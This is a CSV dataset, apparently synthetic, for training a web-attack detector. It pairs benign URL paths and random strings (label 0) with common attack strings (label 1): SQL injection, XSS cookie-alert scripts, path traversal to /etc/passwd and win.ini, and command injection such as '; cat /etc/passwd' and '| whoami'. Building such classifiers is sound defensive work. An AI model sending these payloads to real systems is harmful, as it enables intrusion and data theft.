payload,label
/cart?session=10592,0
../../../../etc/passwd,1
/home?id=8301,0
' OR 1=1 --,1
checkout,0
<script>var a=703;alert(a)</script>,1
zra22Z2NCkweI,0
1' o r '1'='1,1
1medGQPHoqQ3,0
home,0
<script>alert(document.cookie)</script>,1
dj6k04jURG,0
8Hm5ww2BKtPFA,0
admin' --,1
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=967;alert(a)</script>,1
dashboard,0
pm1QQGn4Ltt,0
javascript:alert(1),1
/blog?id=2459,0
' OR '1'='1,1
/user?session=50678,0
settings,0
D71eIM4lfXL9p,0
/search?session=17940,0
' OR 1=1 --,1
onerror=alert(1),1
/settings?id=8619,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
/checkout?session=22461,0
XX4tVP1I,0
6LTEn8dyO,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=654;alert(a)</script>,1
9uHuIZ0F,0
../../../windows/win.ini,1
settings,0
settings,0
ZXWT7cmnOba,0
fB4YkCuM,0
1' o r '1'='1,1
/home?session=67048,0
| whoami,1
search,0
/home?id=3631,0
' OR 3=2 --,1
/search?id=1240,0
admin%00' OR 1=1,1
/checkout?session=80152,0
<script>alert(document.cookie)</script>,1
/dashboard?session=47653,0
profile,0
../../../windows/win.ini,1
/settings?session=18038,0
<script>var a=719;alert(a)</script>,1
<script>var a=265;alert(a)</script>,1
l7IPGOTL79szQX,0
ewAByijqUt81e,0
0zrRSI0l,0
| whoami,1
S9Bh6GJRb,0
<script>var a=574;alert(a)</script>,1
' OR 2=6 --,1
cart,0
/contact?session=83868,0
/login?id=6089,0
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
AOWOD3Vl5V185Q,0
/login?id=3665,0
/cart?session=38831,0
home,0
/profile?session=13369,0
<script>var a=625;alert(a)</script>,1
/settings?id=2402,0
checkout,0
' OR 1=1 --,1
/dashboard?id=7370,0
/about?id=6646,0
/checkout?id=360,0
/dashboard?session=85876,0
/dashboard?session=27506,0
about,0
/blog?session=87616,0
Z5YD2M2wF4QmLTO,0
admin'/* bypass */OR 1=1,1
/home?id=3146,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=45;alert(a)</script>,1
| whoami,1
e1HJH6iOqem,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
z9qHgzV5,0
CK8IBZSIj,0
/index?session=29888,0
' OR 3=2 --,1
<script>var a=301;alert(a)</script>,1
YYxwRjpm,0
68Id03VPxrIUS,0
/cart?session=76700,0
' OR 1=2 --,1
cart,0
onerror=alert(1),1
onerror=alert(1),1
onerror=alert(1),1
; cat /etc/passwd,1
/settings?session=98876,0
/contact?id=9401,0
1xSHS4kq,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=1202,0
cCxK877m1kvE6eE,0
' OR 6=3 --,1
5yjKp57D7,0
/checkout?id=6294,0
blog,0
<script>var a=627;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
/about?session=81056,0
' OR 3=1 --,1
FEQiDoCpzrTwA,0
<script>var a=743;alert(a)</script>,1
TFftJxf7zX,0
/dashboard?session=15690,0
uHnEbjQfdozP,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=636;alert(a)</script>,1
' OR 6=8 --,1
/login?id=6605,0
' OR 5=8 --,1
user,0
about,0
<script>var a=761;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
| whoami,1
' OR 7=9 --,1
profile,0
/about?id=3827,0
<script>var a=635;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
admin' --,1
admin%00' OR 1=1,1
admin%00' OR 1=1,1
NuBfN9Ms4Gp,0
settings,0
/dashboard?session=44709,0
home,0
/blog?session=60221,0
<script>var a=20;alert(a)</script>,1
settings,0
/contact?session=74541,0
/home?id=4025,0
/contact?session=14318,0
profile,0
/settings?id=3674,0
' OR 1=1 --,1
/home?session=19394,0
/dashboard?session=39971,0
' OR 1=1 --,1
' OR 5=5 --,1
/search?id=2244,0
/checkout?session=99545,0
javascript:alert(1),1
rRyrV5hkMBO9,0
/login?session=27256,0
../../../windows/win.ini,1
/search?id=916,0
/about?id=2522,0
/blog?session=64687,0
WOMALpHQBfTgbm,0
q12AfrwWgWyBYU,0
' OR 4=7 --,1
/user?session=29846,0
/about?id=7463,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=3 --,1
gXY7YwcQSIAE31g,0
<script>var a=711;alert(a)</script>,1
RDufyh8hWhlWPt,0
../../../windows/win.ini,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
' OR 2=7 --,1
aRFY6aXw8aR,0
user,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?session=69574,0
onerror=alert(1),1
checkout,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=61387,0
/contact?id=3446,0
../../../windows/win.ini,1
<script>var a=609;alert(a)</script>,1
/about?session=91286,0
' OR 2=4 --,1
/home?id=3668,0
/blog?session=60015,0
/index?id=9108,0
/home?id=6391,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
NW7VAVSdoumf,0
/index?id=8687,0
/settings?session=95205,0
/blog?id=3969,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
Qxol424SeYPOe,0
/about?id=3697,0
admin'/* bypass */OR 1=1,1
admin' --,1
admin' --,1
cart,0
' OR 7=6 --,1
/dashboard?id=2110,0
a3cMgfWy7LEv,0
' OR 2=8 --,1
/blog?id=9045,0
BN4KG2sUpBgc,0
mIbis5vgPuW,0
profile,0
' OR 5=5 --,1
/index?session=60987,0
dashboard,0
blog,0
1' o r '1'='1,1
<script>var a=635;alert(a)</script>,1
/search?session=80085,0
/search?id=5616,0
' OR 4=5 --,1
16xGeKP5RAy,0
/contact?session=99014,0
javascript:alert(1),1
checkout,0
/blog?session=94566,0
/contact?id=3894,0
/user?id=8500,0
/register?id=3283,0
admin' --,1
' OR 2=3 --,1
admin'/* bypass */OR 1=1,1
/about?id=4846,0
tjtch49wzHLWy,0
search,0
/blog?session=24824,0
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
/blog?id=5866,0
/login?session=61410,0
../../../../etc/passwd,1
admin' --,1
admin'/* bypass */OR 1=1,1
<script>var a=676;alert(a)</script>,1
; cat /etc/passwd,1
1OedSQiM,0
<script>var a=525;alert(a)</script>,1
index,0
admin' --,1
<script>var a=259;alert(a)</script>,1
' OR 1=8 --,1
; cat /etc/passwd,1
checkout,0
s E l E c T * f R o M a d m i n,1
/cart?id=6887,0
<script>var a=340;alert(a)</script>,1
onerror=alert(1),1
blog,0
' OR 2=2 --,1
' OR 4=2 --,1
/search?id=9580,0
RkC1rlajMZ37c,0
index,0
9iLLcNdau3VOHN,0
../../../../etc/passwd,1
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
' OR 4=8 --,1
javascript:alert(1),1
iM1MrOarWo,0
WxpBn5jP,0
/login?session=35475,0
' OR 9=4 --,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?session=76921,0
admin' --,1
<script>var a=351;alert(a)</script>,1
/login?session=98839,0
' OR '1'='1,1
' OR 7=3 --,1
onerror=alert(1),1
' OR '1'='1,1
/profile?session=43381,0
KVpVEwEVtOx5Ee,0
cT870enoWGJR5,0
' OR '1'='1,1
/register?id=1650,0
/home?id=8537,0
; cat /etc/passwd,1
' OR 7=8 --,1
1' o r '1'='1,1
<script>var a=447;alert(a)</script>,1
/contact?id=5304,0
RSwIoZLoDeTVlS,0
/dashboard?session=82096,0
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
../../../windows/win.ini,1
onerror=alert(1),1
' OR 8=4 --,1
' OR 3=6 --,1
index,0
/home?session=94748,0
/contact?id=3649,0
/settings?session=55907,0
contact,0
LRPX77NSgXqV3cp,0
' OR 3=5 --,1
index,0
/dashboard?id=2798,0
admin'/* bypass */OR 1=1,1
<script>var a=792;alert(a)</script>,1
<script>var a=414;alert(a)</script>,1
profile,0
/index?session=58806,0
/user?session=29202,0
/login?id=3115,0
/profile?session=16932,0
<script>var a=32;alert(a)</script>,1
<script>var a=880;alert(a)</script>,1
../../../windows/win.ini,1
<script>var a=419;alert(a)</script>,1
9Q3b9SrgMV,0
../../../windows/win.ini,1
/cart?session=12498,0
/cart?session=88091,0
/profile?id=665,0
javascript:alert(1),1
2o8ykMJwrLmn,0
<script>var a=748;alert(a)</script>,1
/cart?id=3991,0
/user?id=3937,0
' OR 1=1 --,1
checkout,0
../../../../etc/passwd,1
/index?id=5880,0
/settings?id=5437,0
/profile?session=74725,0
<script>var a=924;alert(a)</script>,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
<script>alert(document.cookie)</script>,1
admin' --,1
/settings?id=5559,0
<script>var a=522;alert(a)</script>,1
/checkout?session=85983,0
QpUP4EOG,0
<script>alert(document.cookie)</script>,1
f0lyxJWI0eXoF,0
' OR 4=8 --,1
; cat /etc/passwd,1
1' o r '1'='1,1
checkout,0
AYgC2gJPaKYJI1,0
/index?session=50547,0
admin' --,1
admin' --,1
admin' --,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=6380,0
../../../../etc/passwd,1
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
settings,0
<script>var a=803;alert(a)</script>,1
; cat /etc/passwd,1
' OR '1'='1,1
/profile?id=9948,0
' OR 6=6 --,1
/register?id=3141,0
cart,0
<script>var a=769;alert(a)</script>,1
YSJpdKgy14xDgVq,0
javascript:alert(1),1
onerror=alert(1),1
onerror=alert(1),1
/about?session=97063,0
profile,0
admin' --,1
/register?id=6381,0
/checkout?session=25666,0
/profile?id=5208,0
onerror=alert(1),1
' OR 7=3 --,1
user,0
1' o r '1'='1,1
Rx6nAaY4hNWMdV,0
/contact?session=37550,0
<script>var a=54;alert(a)</script>,1
1' o r '1'='1,1
hIdVGJwaT2,0
/dashboard?session=79072,0
QtvwGrurCf,0
; cat /etc/passwd,1
/search?session=67501,0
<script>alert(document.cookie)</script>,1
profile,0
admin'/* bypass */OR 1=1,1
hi4RjkGjSgxk2tZ,0
contact,0
' OR 7=3 --,1
/user?id=6369,0
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
<script>var a=621;alert(a)</script>,1
/dashboard?id=5670,0
/blog?session=69201,0
' OR 6=3 --,1
' OR 1=3 --,1
user,0
../../../../etc/passwd,1
admin' --,1
/cart?session=92599,0
checkout,0
<script>var a=110;alert(a)</script>,1
/contact?id=4233,0
/settings?id=6792,0
' OR 2=3 --,1
javascript:alert(1),1
blog,0
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
/checkout?session=31946,0
/home?session=11980,0
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
/about?session=56337,0
<script>alert(document.cookie)</script>,1
' OR 9=6 --,1
profile,0
E0ZlSjyWjDZBQ6l,0
blog,0
admin' --,1
' OR 5=9 --,1
s E l E c T * f R o M a d m i n,1
| whoami,1
onerror=alert(1),1
/profile?session=23131,0
admin'/* bypass */OR 1=1,1
' OR 2=1 --,1
/user?session=71569,0
/search?session=63500,0
index,0
admin%00' OR 1=1,1
/cart?session=64687,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?session=31353,0
/profile?session=76682,0
' OR 1=1 --,1
/user?session=78816,0
../../../../etc/passwd,1
admin%00' OR 1=1,1
/blog?id=4120,0
' OR 6=7 --,1
EVxzRQXp99WHk,0
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
' OR 9=4 --,1
1' o r '1'='1,1
cklonCuyZD,0
<script>var a=18;alert(a)</script>,1
/contact?session=43376,0
/home?id=8070,0
<script>alert(document.cookie)</script>,1
/dashboard?id=9760,0
uHa3uXiPLhe8c6,0
oAbJhl67k8z0Pa,0
/register?id=9938,0
/register?id=3229,0
admin'/* bypass */OR 1=1,1
checkout,0
about,0
' OR 3=1 --,1
/checkout?session=61875,0
Zz4uofHZHqal,0
/about?id=1754,0
admin%00' OR 1=1,1
' OR 8=1 --,1
' OR 7=3 --,1
index,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
KNKZCDU5,0
/checkout?id=4257,0
/cart?session=75027,0
/contact?session=77570,0
about,0
s E l E c T * f R o M a d m i n,1
fYqvCAaa6,0
/blog?id=8526,0
' OR 9=6 --,1
admin%00' OR 1=1,1
contact,0
admin'/* bypass */OR 1=1,1
' OR 6=9 --,1
/index?id=7711,0
1' o r '1'='1,1
/blog?id=9849,0
<script>var a=182;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?session=30415,0
login,0
<script>var a=730;alert(a)</script>,1
wPDdYAqC4F0c,0
/profile?session=40538,0
73u3XGvPiQ,0
onerror=alert(1),1
../../../../etc/passwd,1
home,0
nziyTf4KiWOm,0
javascript:alert(1),1
home,0
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
/search?id=187,0
; cat /etc/passwd,1
' OR 1=1 --,1
about,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=561,0
ZZ0Tz5VUSzh,0
' OR 3=7 --,1
checkout,0
onerror=alert(1),1
<script>var a=557;alert(a)</script>,1
<script>var a=64;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?id=3421,0
/dashboard?session=28113,0
<script>var a=463;alert(a)</script>,1
DyEyRB8yRUj0,0
JglwdgxuzvnT,0
/about?session=48416,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 3=8 --,1
<script>var a=937;alert(a)</script>,1
<script>var a=622;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
settings,0
; cat /etc/passwd,1
/home?session=92105,0
6u9IF11j,0
' OR 2=3 --,1
X4KC9tZTvSm,0
' OR 9=2 --,1
onerror=alert(1),1
/cart?session=64208,0
/about?id=3605,0
admin%00' OR 1=1,1
Q6nEgTXXouxE5Q,0
javascript:alert(1),1
/user?id=6721,0
/cart?id=7615,0
onerror=alert(1),1
onerror=alert(1),1
' OR 7=6 --,1
<script>var a=162;alert(a)</script>,1
bDvUi9IEP6sAx,0
' OR 1=1 --,1
<script>var a=553;alert(a)</script>,1
1' o r '1'='1,1
contact,0
rZDPda8ITt3y,0
../../../windows/win.ini,1
/search?id=8313,0
../../../windows/win.ini,1
' OR 7=4 --,1
/login?session=99715,0
| whoami,1
vWTzxMN4sk6bG,0
/profile?session=62444,0
/checkout?id=4041,0
' OR 9=8 --,1
admin' --,1
../../../../etc/passwd,1
' OR 8=5 --,1
/profile?id=4453,0
' OR 1=1 --,1
/user?id=9172,0
' OR 7=2 --,1
register,0
/profile?session=74347,0
<script>alert(document.cookie)</script>,1
/home?id=7108,0
s E l E c T * f R o M a d m i n,1
' OR 3=2 --,1
<script>var a=319;alert(a)</script>,1
/search?id=8764,0
/contact?id=3085,0
/index?session=70910,0
/settings?session=69095,0
UW8lFqQaqtu,0
' OR 4=5 --,1
about,0
/contact?id=6481,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?session=85045,0
/index?id=5645,0
javascript:alert(1),1
pNBxvuaOYeqT1j,0
' OR '1'='1,1
1' o r '1'='1,1
/settings?id=9958,0
admin%00' OR 1=1,1
<script>var a=88;alert(a)</script>,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
about,0
blog,0
/login?session=66610,0
/home?id=7983,0
' OR 1=1 --,1
<script>var a=642;alert(a)</script>,1
iTVsU9Vf,0
' OR 6=8 --,1
' OR 8=1 --,1
/index?id=8474,0
onerror=alert(1),1
/user?id=6641,0
' OR 1=1 --,1
aFuEElho,0
/profile?session=51566,0
3rc7rEKp,0
/login?id=6930,0
' OR 1=1 --,1
<script>var a=104;alert(a)</script>,1
' OR 8=4 --,1
/search?session=33400,0
<script>var a=855;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=466;alert(a)</script>,1
/register?id=4778,0
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?session=56842,0
/about?session=82632,0
checkout,0
/register?session=80048,0
/contact?session=66128,0
blog,0
home,0
onerror=alert(1),1
/settings?session=66103,0
/home?id=9501,0
search,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?session=72150,0
<script>var a=605;alert(a)</script>,1
/about?id=9626,0
index,0
/search?id=1410,0
| whoami,1
blog,0
../../../windows/win.ini,1
/dashboard?id=1814,0
/dashboard?session=66477,0
admin'/* bypass */OR 1=1,1
c9YwFFxFggDg,0
1' o r '1'='1,1
' OR 1=1 --,1
<script>var a=530;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=288;alert(a)</script>,1
lLfNbpsXWa54fx,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?id=1161,0
admin%00' OR 1=1,1
contact,0
/index?session=60235,0
| whoami,1
p2Mg4NFH,0
/blog?id=655,0
cg0HWhq77r,0
' OR 8=1 --,1
<script>var a=796;alert(a)</script>,1
/dashboard?id=6020,0
/search?id=574,0
admin%00' OR 1=1,1
/checkout?session=27482,0
index,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?session=15904,0
2aZorUFM7of,0
admin%00' OR 1=1,1
/user?id=3438,0
checkout,0
javascript:alert(1),1
YVW7dIdaGp,0
| whoami,1
cAIt4jS8,0
<script>var a=344;alert(a)</script>,1
admin' --,1
/contact?session=26993,0
1' o r '1'='1,1
<script>var a=882;alert(a)</script>,1
' OR 4=3 --,1
admin%00' OR 1=1,1
/user?id=2372,0
/blog?session=91222,0
onerror=alert(1),1
' OR 5=3 --,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?id=2798,0
/register?id=6031,0
| whoami,1
' OR '1'='1,1
' OR 7=6 --,1
Ti9kGTNauzbQh,0
../../../../etc/passwd,1
<script>var a=482;alert(a)</script>,1
pJDyauzFVBw,0
/index?session=47689,0
about,0
' OR 6=8 --,1
/user?id=5204,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=9620,0
1' o r '1'='1,1
| whoami,1
admin'/* bypass */OR 1=1,1
' OR 8=1 --,1
| whoami,1
lQqHKHWVOENMge,0
p9DBDgZcfQq,0
RnnfrhdZK,0
user,0
rlgKtDnkSoy9AY,0
/login?id=7906,0
/user?id=5081,0
contact,0
search,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?session=45734,0
' OR 1=3 --,1
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
dashboard,0
/login?id=4747,0
/checkout?session=35632,0
settings,0
/checkout?id=8546,0
admin'/* bypass */OR 1=1,1
about,0
/profile?session=54751,0
lWX2Dd6LorvxBy,0
login,0
/checkout?id=1403,0
<script>var a=966;alert(a)</script>,1
/home?session=80341,0
0EjMB5o6nuuhFMJ,0
<script>alert(document.cookie)</script>,1
<script>var a=568;alert(a)</script>,1
/about?session=22928,0
search,0
dashboard,0
vl6bhApbSasS,0
/register?session=86400,0
<script>var a=212;alert(a)</script>,1
' OR 3=6 --,1
admin'/* bypass */OR 1=1,1
' OR 1=1 --,1
user,0
/user?id=4661,0
6plBv4csL,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
/contact?session=96665,0
/register?id=2442,0
/checkout?session=40671,0
javascript:alert(1),1
/home?session=51560,0
/login?id=2126,0
/blog?id=1065,0
; cat /etc/passwd,1
8sag4lhr5,0
/home?session=18806,0
<script>alert(document.cookie)</script>,1
search,0
settings,0
<script>var a=20;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
KNtJpNOH,0
dObVDe83zwQm8KW,0
/checkout?session=46842,0
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
/user?session=70216,0
ikpPFEzVJZerQ,0
tl07y9co9s,0
' OR 3=6 --,1
/login?session=93178,0
/settings?id=4071,0
admin%00' OR 1=1,1
z9bBpdO2qhb,0
<script>var a=167;alert(a)</script>,1
/search?id=8761,0
/login?id=3891,0
/blog?id=9029,0
NjDuJ6Mwk,0
/blog?session=11239,0
admin%00' OR 1=1,1
register,0
xa71yqnaSkn0O54,0
dashboard,0
<script>var a=802;alert(a)</script>,1
profile,0
s E l E c T * f R o M a d m i n,1
register,0
profile,0
1' o r '1'='1,1
sIhpk9ykrBU,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=1 --,1
/user?id=5315,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=980;alert(a)</script>,1
admin' --,1
<script>var a=741;alert(a)</script>,1
/index?session=27499,0
' OR 7=7 --,1
javascript:alert(1),1
/about?id=9518,0
/search?id=7703,0
<script>var a=855;alert(a)</script>,1
settings,0
register,0
oufAPAiDiXstrvK,0
' OR 1=1 --,1
/user?id=2653,0
cart,0
/dashboard?id=3895,0
<script>var a=499;alert(a)</script>,1
/search?session=22495,0
/home?session=10317,0
login,0
<script>var a=658;alert(a)</script>,1
<script>var a=905;alert(a)</script>,1
/home?session=30241,0
/register?id=9784,0
admin%00' OR 1=1,1
DMbupcWiZnP,0
login,0
/about?session=38987,0
/profile?session=68069,0
<script>var a=760;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?session=41288,0
<script>var a=910;alert(a)</script>,1
' OR 4=7 --,1
' OR 4=4 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=38104,0
/about?session=23938,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
fxp0UL85z2Mo,0
blog,0
profile,0
checkout,0
contact,0
/user?session=19924,0
| whoami,1
/login?session=30158,0
<script>var a=22;alert(a)</script>,1
onerror=alert(1),1
/register?id=1533,0
/blog?id=5433,0
' OR 5=7 --,1
/home?session=80552,0
' OR 2=9 --,1
/user?id=1316,0
<script>var a=308;alert(a)</script>,1
' OR 4=4 --,1
admin%00' OR 1=1,1
javascript:alert(1),1
' OR 6=4 --,1
register,0
' OR 7=8 --,1
moIXId8Nxg42uan,0
/settings?session=19338,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?id=2169,0
/register?session=81445,0
/profile?session=87649,0
admin%00' OR 1=1,1
/profile?session=26787,0
' OR 9=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
D7PDIDyKQbtKLu,0
BsxzPkjHCdn,0
4krlOFwgmUWC2CC,0
admin%00' OR 1=1,1
/user?session=20951,0
/contact?session=27945,0
1' o r '1'='1,1
tMuIjOtbG0Yyg,0
' OR 1=1 --,1
<script>var a=773;alert(a)</script>,1
../../../../etc/passwd,1
vPZm9gSKBWt3F0,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=340;alert(a)</script>,1
/home?session=79949,0
/cart?id=6069,0
; cat /etc/passwd,1
' OR 4=9 --,1
/cart?session=28310,0
/user?session=61574,0
admin'/* bypass */OR 1=1,1
/dashboard?session=25528,0
/about?session=43944,0
' OR 6=5 --,1
../../../../etc/passwd,1
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?session=32188,0
vDSYNkaplnrn,0
ZzwRbUQP9x,0
/profile?session=77437,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?session=12405,0
<script>var a=920;alert(a)</script>,1
aXIM4jFZDW8T,0
' OR 9=7 --,1
/dashboard?session=78064,0
<script>var a=10;alert(a)</script>,1
4CLUa0hDQvOE,0
' OR 3=5 --,1
<script>var a=874;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
' OR '1'='1,1
user,0
/dashboard?session=69157,0
/settings?id=6240,0
/cart?session=75979,0
WtCUXuwDZxfn,0
s E l E c T * f R o M a d m i n,1
<script>var a=359;alert(a)</script>,1
admin%00' OR 1=1,1
/home?id=4399,0
/login?id=4973,0
s E l E c T * f R o M a d m i n,1
home,0
<script>var a=290;alert(a)</script>,1
' OR 6=3 --,1
/register?id=1445,0
/blog?id=6678,0
admin%00' OR 1=1,1
<script>var a=902;alert(a)</script>,1
| whoami,1
/index?session=48907,0
' OR '1'='1,1
1' o r '1'='1,1
/register?id=6318,0
/cart?session=59685,0
dashboard,0
/home?session=97237,0
/search?id=5089,0
/user?session=22244,0
/index?id=2812,0
/checkout?id=9043,0
/about?session=55152,0
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
login,0
/register?session=95496,0
cart,0
' OR 1=1 --,1
blog,0
/register?session=46113,0
cart,0
/profile?id=4228,0
/about?id=8924,0
search,0
/profile?session=33861,0
' OR 2=5 --,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
TXDvHPnZiKWc3G,0
user,0
YEEB6KaxGI1cXYe,0
../../../windows/win.ini,1
' OR 2=5 --,1
/user?session=84628,0
search,0
javascript:alert(1),1
/about?id=7829,0
dashboard,0
C8IoxUmJFD1Sa,0
jt2W2GFDuUia,0
/search?id=5315,0
FIc4QT6Ym23P,0
/dashboard?id=5168,0
/about?id=5245,0
<script>var a=54;alert(a)</script>,1
/blog?session=96241,0
<script>var a=947;alert(a)</script>,1
/settings?id=2766,0
blog,0
4Y6beC3HhZ,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=772;alert(a)</script>,1
/login?session=89368,0
/register?id=1522,0
register,0
/checkout?id=3400,0
<script>var a=781;alert(a)</script>,1
/home?session=75108,0
' OR 4=6 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
home,0
<script>var a=766;alert(a)</script>,1
C3dNAQIqeLuF4tg,0
bKeHKohhb0QcV,0
